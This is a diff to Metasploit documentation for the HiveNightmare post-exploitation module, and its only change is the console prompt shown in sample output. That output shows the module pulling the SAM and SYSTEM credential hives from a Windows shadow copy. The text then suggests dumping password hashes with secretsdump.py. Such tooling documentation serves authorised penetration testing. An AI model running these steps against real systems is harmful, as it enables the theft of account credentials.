@@ -50,7 +50,7 @@ This module was successfully tested on Windows 10 20H2.
 See the following output:
 
 ```
-msf6 post(windows/gather/credentials/windows_sam_hivenightmare) > run
+msf post(windows/gather/credentials/windows_sam_hivenightmare) > run
 
 [+] SAM data found in HarddiskVolumeShadowCopy1!
 [+] Retrieving files of index 1 as they are the most recently modified...
@@ -58,11 +58,11 @@ msf6 post(windows/gather/credentials/windows_sam_hivenightmare) > run
 [+] SYSTEM data saved at /home/smcintyre/.msf4/loot/20210729113926_default_192.168.159.15_windows.system_202176.bin
 [+] SAM and SYSTEM data were leaked!
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/windows_sam_hivenightmare) > file /home/smcintyre/.msf4/loot/20210729113916_default_192.168.159.15_windows.sam_763500.bin
+msf post(windows/gather/credentials/windows_sam_hivenightmare) > file /home/smcintyre/.msf4/loot/20210729113916_default_192.168.159.15_windows.sam_763500.bin
 [*] exec: file /home/smcintyre/.msf4/loot/20210729113916_default_192.168.159.15_windows.sam_763500.bin
 
 /home/smcintyre/.msf4/loot/20210729113916_default_192.168.159.15_windows.sam_763500.bin: MS Windows registry file, NT/2000 or above
-msf6 post(windows/gather/credentials/windows_sam_hivenightmare) >
+msf post(windows/gather/credentials/windows_sam_hivenightmare) >
 ```
 
 Then, you can dump the hashes from leaked files with `secretsdump.py` for instance:
